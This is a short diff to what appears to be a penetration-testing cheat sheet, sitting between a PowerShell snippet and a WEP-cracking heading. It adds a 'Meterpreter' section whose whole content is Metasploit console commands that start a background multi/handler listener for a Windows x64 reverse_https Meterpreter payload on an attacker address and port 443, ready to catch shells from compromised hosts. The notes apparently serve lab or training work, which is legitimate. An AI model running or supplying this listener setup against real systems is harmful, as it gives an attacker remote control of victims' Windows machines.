@@ -31,6 +31,16 @@ $results = foreach ($server in $servers) {
 $results
 ```
 
+#### Meterpreter
+
+```
+use exploit/multi/handler 
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 192.168.49.91 
+set LPORT 443
+set ExitOnSession false 
+exploit -j -z 
+```
 
 ### WEP Cracker
 
